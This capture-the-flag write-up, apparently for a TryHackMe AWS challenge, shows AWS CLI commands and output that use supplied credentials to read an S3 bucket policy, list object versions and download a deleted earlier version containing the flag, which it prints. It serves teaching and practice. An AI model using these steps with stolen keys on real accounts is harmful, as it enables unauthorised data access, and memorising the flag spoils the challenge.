# Challenge description

Looks like we got some AWS credentials for the DarkMatter gang. Well, at least for one of its contractors, a guy called ShadowFang. It seems they are hosting all their red team infrastructure in the cloud. Let’s try to get access to the information they stole from people and take it back!

# Soluce

We start by configuring the AWS CLI with the provided credentials:

```sh
export AWS_ACCESS_KEY_ID="ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="SECRET_ACCESS"
export AWS_DEFAULT_REGION="us-west-2"
```

We can now list the contents of the "secret-messages" bucket:

```sh
┌──(virgile㉿localhost)-[~]
└─$ aws s3 ls
2024-05-02 06:43:26 redteamapp-bucket
```

Now we can list the contents of the "redteamapp-bucket" bucket:

```sh
┌──(virgile㉿localhost)-[~/Téléchargements]
└─$ aws s3 ls s3://redteamapp-bucket --recursive                                                                                                                                                                                           

An error occurred (AccessDenied) when calling the ListObjectsV2 operation: User: arn:aws:iam::471112876654:user/sh4d0wF4NG is not authorized to perform: s3:ListBucket on resource: "arn:aws:s3:::redteamapp-bucket" because no identity-based policy allows the s3:ListBucket action
```

We don't have the permission to list the contents of the bucket. 

If we try the following command:

```sh
┌──(virgile㉿localhost)-[~/Téléchargements]
└─$ aws s3api get-bucket-policy --bucket redteamapp-bucket                                                                                                                                                                                 
aws s3api get-bucket-acl --bucket redteamapp-bucket
{
    "Policy": "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"Statement1\",\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::redteamapp-bucket/*\"}]}"
}
{
    "Owner": {
        "DisplayName": "gbflament",
        "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
    },
    "Grants": [
        {
            "Grantee": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0",
                "Type": "CanonicalUser"
            },
            "Permission": "FULL_CONTROL"
        }
    ]
}
```

We see that the bucket policy allows anyone to get objects from the bucket.

We will use the s3api to list the objects in the bucket:

```sh
┌──(virgile㉿localhost)-[~]
└─$ aws s3api list-objects --bucket redteamapp-bucket

An error occurred (AccessDenied) when calling the ListObjects operation: User: arn:aws:iam::471112876654:user/sh4d0wF4NG is not authorized to perform: s3:ListBucket on resource: "arn:aws:s3:::redteamapp-bucket" because no identity-based policy allows the s3:ListBucket action
```

We don't have the permission to list the objects in the bucket. We will use the s3api to list the objects versions in the bucket:

```sh
┌──(virgile㉿localhost)-[~]
└─$ aws s3api list-object-versions --bucket redteamapp-bucket
{
    "Versions": [
        {
            "ETag": "\"6b7fa108fdcafc531506e6299f733be6\"",
            "Size": 0,
            "StorageClass": "STANDARD",
            "Key": "admin/",
            "VersionId": "pFN7hl24nxnwoON4pd3_9xzUze89EVmi",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:47:43+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"169fb30ee5679503474b7a0bd978e815\"",
            "Size": 0,
            "StorageClass": "STANDARD",
            "Key": "admin/",
            "VersionId": "JJsw2ssmC.tLsdhKyDJ0So8Z2p_jg2XA",
            "IsLatest": false,
            "LastModified": "2024-05-07T04:28:52+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"836c2b57fc423e05e7c586682760da10\"",
            "Size": 0,
            "StorageClass": "STANDARD",
            "Key": "admin/",
            "VersionId": "K08XaLhD6ilrgP3GX5iI5MxyPMC4rfqx",
            "IsLatest": false,
            "LastModified": "2024-05-07T04:25:46+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"f37e33070092415b8765f6c458122795\"",
            "Size": 0,
            "StorageClass": "STANDARD",
            "Key": "admin/",
            "VersionId": "_Myac5GZ6hB7zf5gGvw2O0QgWT5iSYyu",
            "IsLatest": false,
            "LastModified": "2024-05-02T05:42:54+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"4ff9cf985deb04c650c10fc81c3906cd\"",
            "Size": 0,
            "StorageClass": "STANDARD",
            "Key": "admin/",
            "VersionId": "6WA2k8raWB91ecULfJtR4GwLW7ml_fa4",
            "IsLatest": false,
            "LastModified": "2024-05-02T05:07:37+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"d41d8cd98f00b204e9800998ecf8427e\"",
            "Size": 0,
            "StorageClass": "STANDARD",
            "Key": "admin/",
            "VersionId": "5un.JiTzcja2HwIwjEg9qy7J7w3L7Y64",
            "IsLatest": false,
            "LastModified": "2024-05-02T04:48:40+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"7b92c95ca1b9779422274c68949ecded\"",
            "Size": 1524,
            "StorageClass": "STANDARD",
            "Key": "admin/index.html",
            "VersionId": "Y8anFvY9dIvMcjhXGxrWHKVIJ0OFoThW",
            "IsLatest": true,
            "LastModified": "2024-05-10T17:53:38+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"43f13f4527a606aafc188f4be0285051\"",
            "Size": 4169,
            "StorageClass": "STANDARD",
            "Key": "admin/index.html",
            "VersionId": "UERAkdEpjINhaB8GcvBmZY5hM8d.wNu5",
            "IsLatest": false,
            "LastModified": "2024-05-10T17:52:04+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"c607f52a75a4fa5b4f132b52229d320a\"",
            "Size": 64,
            "StorageClass": "STANDARD",
            "Key": "admin/index.html",
            "VersionId": "2NjOizFhvwSkHiGV8Gtwzx.YvF.T51aN",
            "IsLatest": false,
            "LastModified": "2024-05-07T04:28:52+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"51d6dad47edae5ca13a9ef7537b14d68\"",
            "Size": 64,
            "StorageClass": "STANDARD",
            "Key": "admin/index.html",
            "VersionId": "xXOqGKWh6VkTM.ePSiKPbaAG7MAb_vq5",
            "IsLatest": false,
            "LastModified": "2024-05-02T05:07:37+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"0ae5ab15d9a5695a4620dd2a725aa540\"",
            "Size": 64,
            "StorageClass": "STANDARD",
            "Key": "admin/index.html",
            "VersionId": "d2GG4pdu5yCLmr6EBDiJ8IC8uC6zxYSb",
            "IsLatest": false,
            "LastModified": "2024-05-02T04:49:16+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"f1a8fe9e98944b9d682ec5c3efac8f17\"",
            "Size": 194699,
            "StorageClass": "STANDARD",
            "Key": "css/bootstrap.min.css",
            "VersionId": "JIWS328NTfwRaTZ3.pP8skQmWreJh5X5",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:34:13+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"5217a51bc6790ee9a5ec4b6e7db3ddaf\"",
            "Size": 1094,
            "StorageClass": "STANDARD",
            "Key": "css/main.css",
            "VersionId": "H87Pyhv9OAAi8ippwjMZB5zFeQKgZkdW",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:34:13+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"6acc247c68f00c58b0ad7f5035026868\"",
            "Size": 297597,
            "StorageClass": "STANDARD",
            "Key": "css/materialdesignicons.css",
            "VersionId": "0NS50eCpr0bh7i3cYbzwBq_hlWlqkW5x",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:34:12+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"1d7bcee1b302339c3b8db10214dc9ec6\"",
            "Size": 403216,
            "StorageClass": "STANDARD",
            "Key": "fonts/materialdesignicons-webfont.woff2",
            "VersionId": "7oJplLMJ2Lt7.C8BaNbJkyOV2zl.LdrY",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:38:29+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"19ac56e14a9fc63efb595560c64ad28f\"",
            "Size": 25214,
            "StorageClass": "STANDARD",
            "Key": "imgs/doogle.png",
            "VersionId": "0cCa2hp80DDxa4VCShR1VHjO0Uxsvgpk",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:34:14+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"7ecd764b68a30c06359dba38d3753381\"",
            "Size": 11484,
            "StorageClass": "STANDARD",
            "Key": "imgs/goodbank.png",
            "VersionId": "Gqx4tW0jHgvr2B4ACZhqf_XpXwm9xKDa",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:34:15+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"2a7bf1cc715a0f763a8d4ce2fb4f7ba6\"",
            "Size": 18080,
            "StorageClass": "STANDARD",
            "Key": "imgs/ttm.png",
            "VersionId": "3UexvQC6GGXZCdMT1qMfv89g7UpLb8OI",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:34:15+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"0a8d7f246e1dac9c44f81f0dc70d0c14\"",
            "Size": 6261,
            "StorageClass": "STANDARD",
            "Key": "index.html",
            "VersionId": "5RSYQxDpfDghwVJuZBCBo9X3ujhzZY3q",
            "IsLatest": true,
            "LastModified": "2024-05-10T05:34:48+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        },
        {
            "ETag": "\"0ae5ab15d9a5695a4620dd2a725aa540\"",
            "Size": 64,
            "StorageClass": "STANDARD",
            "Key": "index.html",
            "VersionId": "tBIntrZCbhLeZsw88dUK.EERRlConzWA",
            "IsLatest": false,
            "LastModified": "2024-05-02T04:45:06+00:00",
            "Owner": {
                "DisplayName": "gbflament",
                "ID": "19da7432652dc2a67b67ddaf3d0619ce1fe87aceb12ec6b6273ba7c0d44799f0"
            }
        }
    ],
    "RequestCharged": null,
    "Prefix": ""
}
```

We can see that there are several versions of the "admin/html" object.

In the actual version of the object, we can see:

```html
<p class="text-muted mb-2">There used to be a flag here...</p>
```

So the flag was removed from the object. We will download the previous version of the object:

```sh
aws s3api get-object --bucket redteamapp-bucket --key "admin/index.html" --version-id "UERAkdEpjINhaB8GcvBmZY5hM8d.wNu5" admin_index_old.html
```

And now we can see the flag:

```html
<h5 class="fs-19 mb-0">
    <p class="primary-link">Flag 1</p>
</h5>
<p class="text-muted mb-2">THM{SSE_can't_stop_ME}</p>
```

So the first flag is `THM{SSE_can't_stop_ME}`.